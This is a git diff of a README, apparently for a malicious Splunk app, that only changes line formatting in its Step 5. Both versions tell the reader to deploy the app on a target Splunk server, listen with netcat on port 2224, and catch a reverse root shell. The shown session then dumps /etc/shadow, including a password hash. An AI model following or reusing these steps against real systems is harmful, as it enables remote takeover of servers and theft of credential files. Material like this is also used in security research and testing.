@@ -24,18 +24,17 @@ Step 4: deploy in the target splunk, and then reboot
 
 ![pic](splunk_install_app.png)
 
-Step 5: listen in your computer with e.g. sudo nc -nlvp "2224"
-sudo nc -nlvp "2224"
-[sudo] password for rpires: 
-Listening on 0.0.0.0 2224
-Connection received on 192.168.1.65 57714
-┌──(root💀kali)-[/]
-└─# cat /etc/shadow
-cat /etc/shadow
-root:!:18764:0:99999:7:::
-....
-user:$y$j9T$6Yi8mmJLaFPUnsIb/EUE31$9iJbm1a7TR/8SPry4ilRUqf5dQqcw1mDJlbdjRSGwsC:18764:0:99999:7:::
-
+Step 5: listen in your computer with:  
+sudo nc -nlvp "2224"  
+[sudo] password for rpires:   
+Listening on 0.0.0.0 2224  
+Connection received on 192.168.1.65 57714  
+┌──(root💀kali)-[/]  
+└─# cat /etc/shadow  
+cat /etc/shadow  
+root:!:18764:0:99999:7:::  
+....  
+user:$y$j9T$6Yi8mmJLaFPUnsIb/EUE31$9iJbm1a7TR/8SPry4ilRUqf5dQqcw1mDJlbdjRSGwsC:18764:0:99999:7:::  
 
 
 # **Iteration 2**
